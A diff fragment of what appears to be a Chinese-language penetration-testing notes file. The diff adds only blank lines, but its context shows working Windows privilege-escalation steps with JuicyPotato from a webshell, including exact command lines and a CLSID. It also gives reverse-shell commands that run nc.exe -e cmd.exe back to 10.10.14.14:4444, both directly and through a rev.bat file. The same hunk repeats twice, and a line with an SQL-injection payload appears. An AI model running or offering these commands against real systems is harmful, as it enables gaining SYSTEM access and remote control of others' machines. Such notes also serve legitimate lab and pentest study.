@@ -125,6 +125,7 @@
 利用的前提是获得了SeImpersonate或者SeAssignPrimaryToken权限，通常在webshell下使用
 whoami /pri   ##查找SeImpersonate and/or SeAssignPrimaryToken
 
+
 0x02、JuicyPotato功能自主选择CLSID
 -c ‘clsid’         #### clsid查找：http://ohpe.it/juicy-potato/CLSID/ 
 自定义COM监听端口
@@ -147,6 +148,7 @@ RPC服务端口：
 Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
 COM -&gt; recv failed with error: 10038查找替换http://ohpe.it/juicy-potato/CLSID/  很幸运2012 Standard中的第一条就成功了：
 ./juicypotato.exe  -l 1337 -p c:\windows\system32\cmd.exe -a &quot;whoami&quot; -t * -c &apos;{e60687f7-01a1-40aa-86ac-db1cbf673334}&apos;
+
 反弹shell：./juicypotato.exe  -l 1337 -p c:\windows\system32\cmd.exe -a &quot;/c c:\users\userpool\desktop\nc.exe -e cmd.exe 10.10.14.14 4444&quot; -t * -c &apos;{e60687f7-01a1-40aa-86ac-db1cbf673334}&apos;或者将paylaod写入bat，-p参数执行bat
 echo &apos;C:\users\userpool\nc.exe -e cmd.exe 10.10.14.14 4444&apos; &gt; rev.bat
 ./juicypotato.exe  -l 1337 -p c:\users\userpool\desktop\rev.bat -t * -c &apos;{e60687f7-01a1-40aa-86ac-db1cbf673334}&apos;RDP下提权：直接弹出一个system权限窗口
@@ -671,6 +673,7 @@ select id,updatexml(1,concat(user(),0x7e,version()),1) from user;select id from 
 利用的前提是获得了SeImpersonate或者SeAssignPrimaryToken权限，通常在webshell下使用
 whoami /pri   ##查找SeImpersonate and/or SeAssignPrimaryToken
 
+
 0x02、JuicyPotato功能自主选择CLSID
 -c ‘clsid’         #### clsid查找：http://ohpe.it/juicy-potato/CLSID/ 
 自定义COM监听端口
@@ -693,6 +696,7 @@ RPC服务端口：
 Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
 COM -&gt; recv failed with error: 10038查找替换http://ohpe.it/juicy-potato/CLSID/  很幸运2012 Standard中的第一条就成功了：
 ./juicypotato.exe  -l 1337 -p c:\windows\system32\cmd.exe -a &quot;whoami&quot; -t * -c &apos;{e60687f7-01a1-40aa-86ac-db1cbf673334}&apos;
+
 反弹shell：./juicypotato.exe  -l 1337 -p c:\windows\system32\cmd.exe -a &quot;/c c:\users\userpool\desktop\nc.exe -e cmd.exe 10.10.14.14 4444&quot; -t * -c &apos;{e60687f7-01a1-40aa-86ac-db1cbf673334}&apos;或者将paylaod写入bat，-p参数执行bat
 echo &apos;C:\users\userpool\nc.exe -e cmd.exe 10.10.14.14 4444&apos; &gt; rev.bat
 ./juicypotato.exe  -l 1337 -p c:\users\userpool\desktop\rev.bat -t * -c &apos;{e60687f7-01a1-40aa-86ac-db1cbf673334}&apos;RDP下提权：直接弹出一个system权限窗口
